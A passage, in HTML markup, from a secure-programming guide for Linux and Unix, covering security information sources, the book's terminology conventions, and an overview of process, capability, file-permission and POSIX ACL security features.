>&#8220;short&#8221;</SPAN
> lists available on-line that are nice and short
but omit a large number of critical issues.
When in doubt, I include the guidance; I believe in that case it&#8217;s better
to make the information
available to everyone in this <SPAN
CLASS="QUOTE"
>&#8220;one stop shop&#8221;</SPAN
> document.
The organization presented here is my own (every list has its own, different
structure), and some of the guidelines (especially the Linux-unique
ones, such as those on capabilities and the FSUID value) are also my own.
Reading all of the referenced documents listed above as well
is highly recommended, though I realize that for many it&#8217;s impractical.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="OTHER-SOURCES"
>2.9. Other Sources of Security Information</A
></H2
><P
>There are a vast number of web sites and mailing lists dedicated to
security issues.
Here are some other sources of security information:
<P
></P
><UL
><LI
><P
><A
HREF="http://www.securityfocus.com"
TARGET="_top"
>Securityfocus.com</A
>
has a wealth of general security-related news and information, and hosts
a number of security-related mailing lists.
See their website for information on how to subscribe and view their archives.
A few of the most relevant mailing lists on SecurityFocus are:
<P
></P
><UL
><LI
><P
>The <SPAN
CLASS="QUOTE"
>&#8220;Bugtraq&#8221;</SPAN
> mailing list is, as noted above,
a <SPAN
CLASS="QUOTE"
>&#8220;full disclosure moderated mailing list for the detailed discussion and
announcement of computer security vulnerabilities:
what they are, how to exploit them, and how to fix them.&#8221;</SPAN
></P
></LI
><LI
><P
>The <SPAN
CLASS="QUOTE"
>&#8220;secprog&#8221;</SPAN
> mailing list is
a moderated mailing list for the discussion of secure software
development methodologies and techniques.
I specifically monitor this list, and I coordinate with its moderator
to ensure that resolutions reached in SECPROG (if I agree with them)
are incorporated into this document.</P
></LI
><LI
><P
>The <SPAN
CLASS="QUOTE"
>&#8220;vuln-dev&#8221;</SPAN
> mailing list discusses potential or undeveloped holes.</P
></LI
></UL
></P
></LI
><LI
><P
>IBM&#8217;s <SPAN
CLASS="QUOTE"
>&#8220;developerWorks: Security&#8221;</SPAN
> has a library of interesting articles.
You can learn more from
<A
HREF="http://www.ibm.com/developer/security"
TARGET="_top"
>http://www.ibm.com/developer/security</A
>.</P
></LI
><LI
><P
>For Linux-specific security information, a good source is
<A
HREF="http://www.linuxsecurity.com"
TARGET="_top"
>LinuxSecurity.com</A
>.
If you&#8217;re interested in auditing Linux code, places to see include
the <A
HREF="http://www.linuxhelp.org/lsap.shtml"
TARGET="_top"
>Linux
Security-Audit Project FAQ</A
>
and <A
HREF="http://www.lkap.org"
TARGET="_top"
>Linux Kernel Auditing Project</A
>
are dedicated to auditing Linux code for security issues.</P
></LI
></UL
>
Of course, if you&#8217;re securing specific systems, you should sign up to
their security mailing lists (e.g., Microsoft's, Red Hat's, etc.)
so you can be warned of any security updates.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CONVENTIONS"
>2.10. Document Conventions</A
></H2
><P
>System manual pages are referenced in the format <EM
>name(number)</EM
>,
where <EM
>number</EM
> is the section number of the manual.
The pointer value that means <SPAN
CLASS="QUOTE"
>&#8220;does not point anywhere&#8221;</SPAN
> is called NULL;
C compilers will convert the integer 0 to the value NULL in most circumstances
where a pointer is needed,
but note that nothing in the C standard requires that NULL actually
be implemented by a series of all-zero bits.
C and C++ treat the character <SPAN
CLASS="QUOTE"
>&#8220;\0&#8221;</SPAN
> (ASCII 0)
specially, and this value
is referred to as NIL in this book (this is usually called <SPAN
CLASS="QUOTE"
>&#8220;NUL&#8221;</SPAN
>,
but <SPAN
CLASS="QUOTE"
>&#8220;NUL&#8221;</SPAN
> and <SPAN
CLASS="QUOTE"
>&#8220;NULL&#8221;</SPAN
> sound identical).
Function and method names always use the correct case, even if that means
that some sentences must begin with a lower case letter.
I use the term <SPAN
CLASS="QUOTE"
>&#8220;Unix-like&#8221;</SPAN
> to mean Unix, Linux, or other systems whose
underlying models are very similar to Unix;
I can&#8217;t say POSIX, because there are systems such as Windows 2000 that
implement portions of POSIX yet have vastly different security models.</P
><P
>An attacker is called an <SPAN
CLASS="QUOTE"
>&#8220;attacker&#8221;</SPAN
>, <SPAN
CLASS="QUOTE"
>&#8220;cracker&#8221;</SPAN
>, or <SPAN
CLASS="QUOTE"
>&#8220;adversary&#8221;</SPAN
>,
and not a <SPAN
CLASS="QUOTE"
>&#8220;hacker&#8221;</SPAN
>.
Some journalists mistakenly use the word <SPAN
CLASS="QUOTE"
>&#8220;hacker&#8221;</SPAN
> instead of <SPAN
CLASS="QUOTE"
>&#8220;attacker&#8221;</SPAN
>;
this book avoids this misuse, because many
Linux and Unix developers refer to themselves as <SPAN
CLASS="QUOTE"
>&#8220;hackers&#8221;</SPAN
>
in the traditional non-evil sense of the term.
To many Linux and Unix developers, the term <SPAN
CLASS="QUOTE"
>&#8220;hacker&#8221;</SPAN
> continues
to mean simply an expert or enthusiast, particularly regarding computers.
It is true that some hackers commit malicious or intrusive actions,
but many other hackers do not,
and it&#8217;s unfair to claim that all hackers perform malicious activities.
Many other glossaries and books note that not all hackers are attackers.
For example,
the Industry Advisory Council&#8217;s Information Assurance (IA)
Special Interest Group (SIG)&#8217;s
<A
HREF="https://web.archive.org/web/20021214041204/http://www.iaconline.org/sig_infoassure.html"
TARGET="_top"
>Information Assurance Glossary</A
> defines hacker as
<SPAN
CLASS="QUOTE"
>&#8220;A person who delights in having an intimate understanding of the
internal workings of computers and computer networks.
The term is misused in a negative context where <SPAN
CLASS="QUOTE"
>&#8216;cracker&#8217;</SPAN
>
should be used.&#8221;</SPAN
>
<A
HREF="http://www.catb.org/~esr/jargon"
TARGET="_top"
>The
Jargon File</A
> has a
<A
HREF="http://www.catb.org/~esr/jargon/html/entry/hacker.html"
TARGET="_top"
>long and complicate definition for hacker</A
>, starting with
<SPAN
CLASS="QUOTE"
>&#8220;A person who enjoys exploring the details of programmable systems
and how to stretch their capabilities,
as opposed to most users, who prefer to learn only the minimum necessary.&#8221;</SPAN
>;
it notes although some people use the term to mean
<SPAN
CLASS="QUOTE"
>&#8220;A malicious meddler who tries to discover sensitive information
by poking around&#8221;</SPAN
>,
it also states that this definition is deprecated and
that the correct term for this sense
is <SPAN
CLASS="QUOTE"
>&#8220;cracker&#8221;</SPAN
> instead.</P
><P
>This book uses the <EM
>logical</EM
> quotation system,
not the misleading <EM
>typesetters&#8217;</EM
> quotation system.
This means that quoted information
does <EM
>not</EM
>
include any trailing punctuation if the punctuation
is not part of the material being quoted.
The typesetters&#8217; quotation system
causes extraneous characters to be placed inside the quotes;
this has no affect in poetry but
is a serious problem when accuracy is important.
The typesetters&#8217; quotation system
often falsifies quotes (since it includes punctuation not in the quote)
and can be disastrously erroneous in code or computer commands.
The logical quotation system is widely used in a variety of publications,
including
<A
HREF="http://www.catb.org/jargon/html/writing-style.html"
TARGET="_top"
><EM
>The Jargon File</EM
></A
>,
<A
HREF="http://en.wikipedia.org/wiki/Wikipedia:Logical_quotation_on_Wikipedia"
TARGET="_top"
>Wikipedia</A
>,
and the Linguistic Society of America.
This book uses standard American (not British) spelling.</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="FEATURES"
></A
>Chapter 3. Summary of Linux and Unix Security Features</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>Discretion will protect you, and understanding will guard you.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Proverbs 2:11 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>Before discussing guidelines on how to use Linux or Unix security features,
it&#8217;s useful to know what those features are from a programmer&#8217;s viewpoint.
This section briefly describes those features that are widely available
on nearly all Unix-like systems.
However, note that there is considerable variation between
different versions of Unix-like systems, and
not all systems have the abilities described here.
This chapter also notes some extensions or features specific to Linux;
Linux distributions tend to be fairly similar to each other from the
point-of-view of programming for security, because they all use essentially
the same kernel and C library (and the GPL-based licenses encourage rapid
dissemination of any innovations).
It also notes some of the security-relevant differences between different
Unix implementations, but please note that this isn&#8217;t an exhaustive list.
This chapter doesn&#8217;t discuss issues such as implementations of
mandatory access control (MAC) which many Unix-like systems do not implement.
If you already know what
those features are, please feel free to skip this section.</P
><P
>Many programming guides skim briefly over the security-relevant portions
of Linux or Unix and skip important information.
In particular, they often discuss <SPAN
CLASS="QUOTE"
>&#8220;how to use&#8221;</SPAN
> something in general terms
but gloss over the security attributes that affect their use.
Conversely, there&#8217;s a great deal of detailed information in
the manual pages about individual functions, but the manual pages
sometimes obscure key security issues with detailed discussions on how
to use each individual function.
This section tries to bridge that gap; it gives an overview of
the security mechanisms in Linux that are likely to be used
by a programmer, but concentrating specifically on the security
ramifications.
This section has more depth than the typical programming guides, focusing
specifically on security-related matters, and points to references
where you can get more details.</P
><P
>First, the basics.
Linux and Unix are
fundamentally divided into two parts: the kernel and <SPAN
CLASS="QUOTE"
>&#8220;user space&#8221;</SPAN
>.
Most programs execute in user space (on top of the kernel).
Linux supports the concept of <SPAN
CLASS="QUOTE"
>&#8220;kernel modules&#8221;</SPAN
>, which is simply the
ability to dynamically load code into the kernel, but note that it
still has this fundamental division.
Some other systems (such as the HURD) are <SPAN
CLASS="QUOTE"
>&#8220;microkernel&#8221;</SPAN
> based systems; they
have a small kernel with more limited functionality, and a set of <SPAN
CLASS="QUOTE"
>&#8220;user&#8221;</SPAN
>
programs that implement the lower-level functions traditionally implemented
by the kernel.</P
><P
>Some Unix-like systems have been extensively modified to support
strong security, in particular to support U.S. Department of Defense
requirements for Mandatory Access Control (level B1 or higher).
This version of this book doesn&#8217;t cover these systems or issues;
I hope to expand to that in a future version.
More detailed information on some of them is available elsewhere, for
example, details on SGI&#8217;s <SPAN
CLASS="QUOTE"
>&#8220;Trusted IRIX/B&#8221;</SPAN
>
are available in NSA&#8217;s
<A
HREF="http://www.radium.ncsc.mil/tpep/library/fers/index.html"
TARGET="_top"
>Final
Evaluation Reports (FERs)</A
>.</P
><P
>When users log in, their usernames are mapped to integers marking their
<SPAN
CLASS="QUOTE"
>&#8220;UID&#8221;</SPAN
> (for <SPAN
CLASS="QUOTE"
>&#8220;user id&#8221;</SPAN
>) and the <SPAN
CLASS="QUOTE"
>&#8220;GID&#8221;</SPAN
>s (for <SPAN
CLASS="QUOTE"
>&#8220;group id&#8221;</SPAN
>) that they
are a member of.
UID 0 is a special privileged user (role) traditionally called <SPAN
CLASS="QUOTE"
>&#8220;root&#8221;</SPAN
>;
on most Unix-like systems (including the normal Linux kernel) root
can overrule most security checks and is used to administrate the system.
On some Unix systems, GID 0 is also special and permits unrestricted access
normal to resources at the group level [Gay 2000, 228];
this isn&#8217;t true on other systems (such as Linux), but even in those systems
group 0 is essentially all-powerful because so many special system files
are owned by group 0.
Processes are the only <SPAN
CLASS="QUOTE"
>&#8220;subjects&#8221;</SPAN
> in terms of security (that is, only
processes are active objects).
Processes can access various data objects, in particular filesystem
objects (FSOs), System V Interprocess Communication (IPC) objects, and
network ports.
Processes can also set signals.
Other security-relevant topics include quotas and limits, libraries,
auditing, and PAM.
The next few subsections detail this.</P
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PROCESSES"
>3.1. Processes</A
></H2
><P
>In Unix-like systems,
user-level activities are implemented by running processes.
Most Unix systems support a <SPAN
CLASS="QUOTE"
>&#8220;thread&#8221;</SPAN
> as a separate concept;
threads share memory inside a process, and the system scheduler actually
schedules threads.
Linux does this differently (and in my opinion uses a better approach):
there is no essential difference between a thread and a process.
Instead, in Linux, when a process creates another process it can choose
what resources are shared (e.g., memory can be shared).
The Linux kernel then performs optimizations to get thread-level speeds;
see clone(2) for more information.
It&#8217;s worth noting that the Linux kernel developers tend to use the
word <SPAN
CLASS="QUOTE"
>&#8220;task&#8221;</SPAN
>, not <SPAN
CLASS="QUOTE"
>&#8220;thread&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;process&#8221;</SPAN
>, but the external
documentation tends to use the word process
(so I&#8217;ll use the term <SPAN
CLASS="QUOTE"
>&#8220;process&#8221;</SPAN
> here).
When programming a multi-threaded application,
it&#8217;s usually better to use one of the standard
thread libraries that hide these differences.
Not only does this make threading more portable, but some libraries
provide an additional level of indirection, by implementing more than
one application-level thread as a single operating system thread;
this can provide some improved performance on some systems for
some applications.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="PROCESS-ATTRIBUTES"
>3.1.1. Process Attributes</A
></H3
><P
>Here are typical attributes associated with each process in a
Unix-like system:

<P
></P
><UL
><LI
><P
>RUID, RGID - real UID and GID
of the user on whose behalf the process is running</P
></LI
><LI
><P
>EUID, EGID - effective UID and GID
used for privilege checks (except for the filesystem)</P
></LI
><LI
><P
>SUID, SGID - Saved UID and GID;
used to support switching permissions <SPAN
CLASS="QUOTE"
>&#8220;on and off&#8221;</SPAN
> as discussed below.
Not all Unix-like systems support this, but the vast majority do
(including Linux and Solaris);
if you want to check if a given system implements this option in the
POSIX standard, you can use sysconf(2) to determine if
_POSIX_SAVED_IDS is in effect.</P
></LI
><LI
><P
>supplemental groups - a list of groups (GIDs) in which this
user has membership.
In the original version 7 Unix, this didn&#8217;t exist -
processes were only a member of one group at a time, and a special
command had to be executed to change that group.
BSD added support for a list of groups in each process,
which is more flexible, and
this addition is now widely implemented (including by Linux and Solaris).</P
></LI
><LI
><P
>umask - a set of bits determining the default access control settings
when a new filesystem object is created; see umask(2).</P
></LI
><LI
><P
>scheduling parameters - each process has a scheduling policy, and those
with the default policy SCHED_OTHER have the additional parameters
nice, priority, and counter.  See sched_setscheduler(2) for more information.</P
></LI
><LI
><P
>limits - per-process resource limits (see below).</P
></LI
><LI
><P
>filesystem root - the process&#8217; idea of where the root filesystem
(<SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
>) begins; see chroot(2).</P
></LI
></UL
>&#13;</P
><P
>Here are less-common attributes associated with processes:

<P
></P
><UL
><LI
><P
>FSUID, FSGID - UID and GID used for filesystem access checks;
this is usually equal to the EUID and EGID respectively.
This is a Linux-unique attribute.</P
></LI
><LI
><P
>capabilities - POSIX capability information; there are actually three
sets of capabilities on a process: the effective, inheritable, and permitted
capabilities.  See below for more information on POSIX capabilities.
Linux kernel version 2.2 and greater support this; some other Unix-like
systems do too, but it&#8217;s not as widespread.</P
></LI
></UL
>&#13;</P
><P
>In Linux,
if you really need to know exactly what attributes are associated
with each process, the most definitive source is the
Linux source code, in particular
<TT
CLASS="FILENAME"
>/usr/include/linux/sched.h</TT
>&#8217;s definition of task_struct.</P
><P
>The portable way to create new processes it use the fork(2) call.
BSD introduced a variant called vfork(2) as an optimization technique.
The bottom line with vfork(2) is simple: <EM
>don&#8217;t</EM
> use it if you
can avoid it.
See <A
HREF="#AVOID-VFORK"
>Section 8.6</A
> for more information.</P
><P
>Linux supports the Linux-unique clone(2) call.
This call works like fork(2), but allows specification of which resources
should be shared (e.g., memory, file descriptors, etc.).
Various BSD systems implement an rfork() system call
(originally developed in Plan9); it has different
semantics but the same general idea (it also creates a process with tighter
control over what is shared).
Portable programs shouldn&#8217;t use these calls directly, if possible;
as noted earlier,
they should instead rely on threading libraries that use such
calls to implement threads.</P
><P
>This book is not a full tutorial on writing programs, so
I will skip widely-available information handling processes.
You can see the documentation for wait(2), exit(2), and so on for more
information.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="POSIX-CAPABILITIES"
>3.1.2. POSIX Capabilities</A
></H3
><P
>POSIX capabilities are sets of bits that permit splitting of the privileges
typically held by root into a larger set of more specific privileges.
POSIX capabilities are defined
by a draft IEEE standard; they&#8217;re not unique to Linux but they&#8217;re not
universally supported by other Unix-like systems either.
Linux kernel 2.0 did not support POSIX capabilities, while version 2.2
added support for POSIX capabilities to processes.
When Linux documentation (including this one)
says <SPAN
CLASS="QUOTE"
>&#8220;requires root privilege&#8221;</SPAN
>, in nearly all cases it
really means <SPAN
CLASS="QUOTE"
>&#8220;requires a capability&#8221;</SPAN
> as documented in the capability
documentation.
If you need to know the specific capability required, look it up in the
capability documentation.</P
><P
>In Linux,
the eventual intent is to permit capabilities to be attached to files
in the filesystem; as of this writing, however, this is not yet supported.
There is support for transferring capabilities, but this is disabled
by default.
Linux version 2.2.11 added a feature that makes capabilities
more directly useful, called the <SPAN
CLASS="QUOTE"
>&#8220;capability bounding set&#8221;</SPAN
>.
The capability bounding set is a list of capabilities
that are allowed to be held by any process on the system (otherwise,
only the special init process can hold it).
If a capability does not appear in the bounding set, it may not be
exercised by any process, no matter how privileged. 
This feature can be used to, for example, disable kernel module loading.
A sample tool that takes advantage of this is LCAP at
<A
HREF="http://pweb.netcom.com/~spoon/lcap/"
TARGET="_top"
>http://pweb.netcom.com/~spoon/lcap/</A
>.</P
><P
>More information about POSIX capabilities is available at
<A
HREF="ftp://linux.kernel.org/pub/linux/libs/security/linux-privs"
TARGET="_top"
>ftp://linux.kernel.org/pub/linux/libs/security/linux-privs</A
>.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="PROCESS-CREATION"
>3.1.3. Process Creation and Manipulation</A
></H3
><P
>Processes may be created using fork(2), the non-recommended vfork(2),
or the Linux-unique clone(2); all of these system calls duplicate the existing
process, creating two processes out of it.
A process can execute a different program by calling execve(2),
or various front-ends to it (for example, see exec(3), system(3), and popen(3)).</P
><P
>When a program is executed, and its file has its setuid or setgid bit set,
the process&#8217;
EUID or EGID (respectively) is usually set to the file&#8217;s value.
This functionality was the source of an old Unix security weakness
when used to support setuid or setgid scripts, due to a race condition.
Between the time the kernel opens the file to see which interpreter to run,
and when the (now-set-id) interpreter turns around and reopens
the file to interpret it, an attacker might change the file
(directly or via symbolic links).</P
><P
>Different Unix-like systems handle the security issue for setuid scripts
in different ways.
Some systems, such as Linux, completely ignore the setuid and setgid
bits when executing scripts, which is clearly a safe approach.
Most modern releases of SysVr4 and BSD 4.4 use a different approach to
avoid the kernel race condition.
On these systems, when the kernel passes
the name of the set-id script to open to the interpreter,
rather than using a pathname (which would permit the race condition)
it instead passes the filename /dev/fd/3.  This is a special
file already opened on the script, so that there can be no
race condition for attackers to exploit.
Even on these systems I recommend against using the setuid/setgid
shell scripts language for secure programs, as discussed below.</P
><P
>In some cases a process can affect the various UID and GID values; see
setuid(2), seteuid(2), setreuid(2), and the Linux-unique setfsuid(2).
In particular the saved user id (SUID) attribute
is there to permit trusted programs to temporarily switch UIDs.
Unix-like systems supporting the SUID use the following rules:
If the RUID is changed, or the EUID is set to a value not equal to the RUID,
the SUID is set to the new EUID.
Unprivileged users can set their EUID from their SUID,
the RUID to the EUID, and the EUID to the RUID.</P
><P
>The Linux-unique
FSUID process attribute is intended to permit programs like the NFS server
to limit themselves to only the filesystem rights of some given UID
without giving that UID permission to send signals to the process.
Whenever the EUID is changed, the FSUID is changed to the new
EUID value; the FSUID value can be set separately using setfsuid(2), a
Linux-unique call.
Note that non-root callers can only set FSUID to the current
RUID, EUID, SEUID, or current FSUID values.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="FILES"
>3.2. Files</A
></H2
><P
>On all Unix-like systems, the primary repository of information is
the file tree, rooted at <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
>.
The file tree is a hierarchical set of directories, each of which
may contain filesystem objects (FSOs).</P
><P
>In Linux,
filesystem objects (FSOs) may be ordinary files, directories,
symbolic links, named pipes (also called first-in first-outs or FIFOs),
sockets (see below),
character special (device) files, or block special (device) files
(in Linux, this list is given in the find(1) command).
Other Unix-like systems have an identical or similar list of FSO types.</P
><P
>Filesystem objects are collected on filesystems, which can be
mounted and unmounted on directories in the file tree.
A filesystem type (e.g., ext2 and FAT) is a specific set of conventions
for arranging data on the disk to optimize speed, reliability, and so on;
many people use the term <SPAN
CLASS="QUOTE"
>&#8220;filesystem&#8221;</SPAN
> as a synonym for the filesystem type.</P
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="FSO-ATTRIBUTES"
>3.2.1. Filesystem Object Attributes</A
></H3
><P
>Different Unix-like systems support different filesystem types.
Filesystems may have slightly different sets of access control attributes
and access controls can be affected by options selected at mount time.
On Linux, the ext2 filesystems is currently the most popular filesystem,
but Linux supports a vast number of filesystems.
Most Unix-like systems tend to support multiple filesystems too.</P
><P
>Most filesystems on Unix-like systems store at least the following:

<P
></P
><UL
><LI
><P
>owning UID and GID - identifies the <SPAN
CLASS="QUOTE"
>&#8220;owner&#8221;</SPAN
> of the filesystem
object.  Only the owner or root can change the access control attributes
unless otherwise noted.</P
></LI
><LI
><P
>permission bits -
read, write, execute bits for each of user (owner), group, and other.
For ordinary files, read, write, and execute have their typical meanings.
In directories, the <SPAN
CLASS="QUOTE"
>&#8220;read&#8221;</SPAN
> permission is necessary to display a directory&#8217;s
contents, while the <SPAN
CLASS="QUOTE"
>&#8220;execute&#8221;</SPAN
> permission is sometimes called <SPAN
CLASS="QUOTE"
>&#8220;search&#8221;</SPAN
>
permission and is necessary to actually enter the directory to use its contents.
In a directory <SPAN
CLASS="QUOTE"
>&#8220;write&#8221;</SPAN
> permission on a directory permits
adding, removing, and renaming files in that directory; if you only want
to permit adding, set the sticky bit noted below.
Note that the permission values of symbolic links are never used; it&#8217;s only
the values of their containing directories and the linked-to file that matter.</P
></LI
><LI
><P
><SPAN
CLASS="QUOTE"
>&#8220;sticky&#8221;</SPAN
> bit - when set on a directory, unlinks (removes) and
renames of files in that directory are limited to
the file owner, the directory owner, or root privileges.
This is a very common Unix extension
and is specified in the
Open Group&#8217;s Single Unix Specification version 2.
Old versions of Unix called this the <SPAN
CLASS="QUOTE"
>&#8220;save program text&#8221;</SPAN
> bit and used this
to indicate executable files that should stay in memory.
Systems that did this ensured that only root could set this bit
(otherwise users could have crashed systems by forcing <SPAN
CLASS="QUOTE"
>&#8220;everything&#8221;</SPAN
>
into memory).
In Linux, this bit has no effect on ordinary files and ordinary users
can modify this bit on the files they own:
Linux&#8217;s virtual memory management makes this old use irrelevant.</P
></LI
><LI
><P
>setuid, setgid - when set on an executable file,
executing the file will set the process&#8217; effective UID or effective GID
to the value of the file&#8217;s owning UID or GID (respectively).
All Unix-like systems support this.
In Linux and System V systems,
when setgid is set on a file that does not have any execute privileges,
this indicates a file that is subject to mandatory locking
during access (if the filesystem is mounted to support mandatory locking);
this overload of meaning surprises many and is not universal across Unix-like
systems.
In fact, the Open Group&#8217;s Single Unix Specification version 2 for chmod(3)
permits systems to ignore
requests to turn on setgid for files that aren&#8217;t executable if such
a setting has no meaning.
In Linux and Solaris,
when setgid is set on a directory, files created in the directory will
have their GID automatically reset to that of the directory&#8217;s GID.
The purpose of this approach is to support <SPAN
CLASS="QUOTE"
>&#8220;project directories&#8221;</SPAN
>:
users can save files into such specially-set directories and the group
owner automatically changes.
However, setting the setgid bit on directories is not specified by
standards such as the Single Unix Specification
[Open Group 1997].</P
></LI
><LI
><P
>timestamps - access and modification times are stored for each
filesystem object.  However, the owner is allowed to set these values
arbitrarily (see touch(1)), so be careful about trusting this information.
All Unix-like systems support this.</P
></LI
></UL
>&#13;</P
><P
>The following attributes are Linux-unique extensions on the ext2
filesystem, though many other filesystems have similar functionality:

<P
></P
><UL
><LI
><P
>immutable bit - no changes to the filesystem object are allowed;
only root can set or clear this bit.
This is only supported by ext2 and is not portable across all Unix
systems (or even all Linux filesystems).</P
></LI
><LI
><P
>append-only bit - only appending to the filesystem object are allowed;
only root can set or clear this bit.
This is only supported by ext2 and is not portable across all Unix
systems (or even all Linux filesystems).</P
></LI
></UL
></P
><P
>Other common extensions include some sort of bit indicating
<SPAN
CLASS="QUOTE"
>&#8220;cannot delete this file&#8221;</SPAN
>.</P
><P
>Some Unix-like systems also support extended attributes
(known as in the Macintosh world as
<SPAN
CLASS="QUOTE"
>&#8220;resource forks&#8221;</SPAN
>), which are essentially
name/value pairs associated with files or directories
but not stored inside the data of the file or directory itself.
Extended attributes can store more detailed access control information,
a MIME type, and so on.
Linux kernel 2.6 adds this capability, but since many systems and
filesystems don&#8217;t support it, many programs choose not to use them.</P
><P
>Some Unix-like systems support POSIX access control lists (ACLs),
which allow users to specify in more detail who specifically
can access a file and how.
See <A
HREF="#POSIX-ACLS"
>Section 3.2.2</A
> for more information.</P
><P
>Many of these values can be influenced at mount time, so that, for example,
certain bits can be treated as though they had a certain value (regardless
of their values on the media).
See mount(1) for more information about this.
These bits are useful, but be aware that some of these are intended to
simplify ease-of-use and aren&#8217;t really sufficient to prevent certain actions.
For example, on Linux, mounting with <SPAN
CLASS="QUOTE"
>&#8220;noexec&#8221;</SPAN
> will disable execution of
programs on that file system; as noted in the manual, it&#8217;s
intended for mounting filesystems containing binaries for incompatible systems.
On Linux,
this option won&#8217;t completely prevent someone from running the files;
they can copy the files somewhere else to run them, or even use the
command <SPAN
CLASS="QUOTE"
>&#8220;/lib/ld-linux.so.2&#8221;</SPAN
> to run the file directly.</P
><P
>Some filesystems don&#8217;t support some of these access control values; again,
see mount(1) for how these filesystems are handled.
In particular, many Unix-like systems support MS-DOS disks, which by
default support very few of these attributes (and there&#8217;s not standard
way to define these attributes).
In that case, Unix-like systems emulate the standard attributes
(possibly implementing them through special on-disk files), and these
attributes are generally influenced by the mount(1) command.</P
><P
>It&#8217;s important to note that, for adding and removing files, only the
permission bits and owner of the file&#8217;s <EM
>directory</EM
>
really matter unless the Unix-like system supports
more complex schemes (such as POSIX ACLs).
Unless the system has other extensions, and
stock Linux 2.2 and 2.4 do not,
a file that has no permissions in its permission bits
can still be removed if its containing directory permits it
(exception: directories marked as "sticky" have special rules).
Also, if an ancestor directory permits its children to be changed by some
user or group, then any of that directory&#8217;s descendants can be replaced by
that user or group.</P
><P
>It&#8217;s worth noting that in Linux, the Linux ext2
filesystem by default reserves a small amount of space for the root user.
This is a partial defense against denial-of-service attacks; even if a user
fills a disk that is shared with the root user, the root user has a little
space left over (e.g., for critical functions).
The default is 5% of the filesystem space; see mke2fs(8),
in particular its <SPAN
CLASS="QUOTE"
>&#8220;-m&#8221;</SPAN
> option.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="POSIX-ACLS"
>3.2.2. POSIX Access Control Lists (ACLs)</A
></H3
><DIV
CLASS="SECT3"
><H4
CLASS="SECT3"
><A
NAME="HISTORY-POSIX-ACLS"
>3.2.2.1. History of POSIX Access Control Lists (ACLs)</A
></H4
><P
>The original Unix access control bits (user, group and other values for
read, write, and execute) has been remarkably effective for a variety
of uses.
Still, a number of users have complained that this model was too difficult
to use in some circumstances when sharing data between people.
Many people wanted to add sets of groups, or describe special rights for
a number of specific groups, to a given file or directory, and the
original approach didn&#8217;t make that easy.</P
><P
>The IEEE formed a POSIX standard working group to identify common interfaces
for a large number of security-related interfaces, including how to
create more complicated access control lists
(termed "POSIX ACLs").
However, after 13 years of work, the group disbanded without ever
agreeing on final draft standards.
The IEEE draft standard specifications (IEEE 1003.1e and IEEE 1003.2c)
were last edited on October 14th, 1997,
and were officially disbanded on March 10th, 1999.
I believe a key reason that this effort failed was because
the specification tried to cover too many different areas.
As a result, it wasn&#8217;t possible to gain consensus on everything they
were specifying, and the lengthy time meant that eventually everyone gave up.
<A
HREF="http://wt.xpilot.org/publications/posix.1e/download.html"
TARGET="_top"
>Copies of the draft standards are available for free.</A
></P
><P
>Interestingly enough, the story doesn&#8217;t end there.
Although few vendors were interested in implementing all the interfaces
devised by the working group, there was a lot of interest in implementing
more flexible access control lists.
While there were other ways to implement access control lists, the
working group had come up with a reasonable approach and written it down.
Most importantly, they gave a detailed and reasonable
justification of why implementors should do it this way.
This is more important than it might first appear - although more sophisticated
ACLs are an old idea, the problem is that users wanted an upward-compatible
approach that wouldn&#8217;t cause problems with the many existing applications.
A "pure ACL" approach where the old approach would be ignored would have
required re-examination of many existing programs to make sure they didn&#8217;t
cause security problems - any miss might have caused a security lapse.
Several other alternatives were considered as well by the working group,
and after careful examination they created their final approach,
which emphasized compatibility with existing applications.</P
><P
>As a result, developers of Unix-like systems have slowly started to
add POSIX access control lists, more or less as they were described in
the last working draft.
This includes more recent versions of
SGI Irix, Sun Solaris, FreeBSD, and the
Linux kernel 2.6 (which adds POSIX access control lists
as well as extended attributes).
For more information on the Linux kernel implementation of these and
some userspace tools, see
<A
HREF="http://acl.bestbits.at"
TARGET="_top"
>http://acl.bestbits.at</A
>.</P
><P
>However, while it&#8217;s important to write programs that work with
POSIX ACLs, it may not be wise yet to depend on them if you&#8217;re
writing portable applications.
Versions of the Linux kernel before 2.6 didn&#8217;t have POSIX ACLs,
and it&#8217;s worth noting
that many user-space tools (particularly backup programs like tar) and
filesystem formats do not necessarily support them either.
Although the NFSv4 specification supports POSIX ACLs, many NFS
implementations do not or only partially support them.
In short, POSIX ACLs are slowly becoming available,
but you may have teething pains in some cases if you depend on them
extensively.</P
></DIV
><DIV
CLASS="SECT3"
><HR><H4
CLASS="SECT3"
><A
NAME="STATE-POSIX-ACLS"
>3.2.2.2. Data used in POSIX Access Control Lists (ACLs)</A
></H4
><P
>In POSIX ACLs, an FSO may have an additional set of "ACL entries" that
are used for determining who can access the FSO;
every directory can also have a set of default ACL entries used when
an FSO is created inside it.
Each ACL entry can be one of a number of different types,
and each entry also what accesses are granted
(r for read, w for write, x for execute).
Unfortunately, the POSIX draft names for these ACL entry types
are really ugly;
it&#8217;s actually a simple system, complicated by bad names.
There are "short form" and "long form" ways of displaying and setting this
information.</P
><P
